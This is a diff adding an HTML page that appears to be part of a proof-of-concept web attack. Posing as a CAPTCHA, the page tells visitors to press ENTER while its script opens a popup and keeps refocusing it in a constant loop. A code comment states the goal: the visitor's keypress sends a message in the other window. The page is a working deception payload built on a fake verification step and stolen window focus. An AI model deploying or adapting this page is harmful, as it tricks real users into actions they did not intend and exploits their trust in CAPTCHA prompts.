@@ -1,0 +1,21 @@
+<meta charset="UTF-8" />
+<link rel="stylesheet" href="style.css" />
+<script src="utils.js"></script>
+<body>
+  <h1>CAPTCHA</h1>
+  <p>
+    Perfect! Now <b>press <kbd>ENTER</kbd> on your keyboard</b> to complete the verification.
+  </p>
+  <img src="enter.svg" />
+  <script>
+    w = window.open("", "popup");
+
+    backToStartIfClosed();
+    setTimeout(focusMessageBox, 1000);
+
+    setInterval(() => {
+      // Keep popup focused, so pressing ENTER sends the message
+      w.focus();
+    }, 0);
+  </script>
+</body>
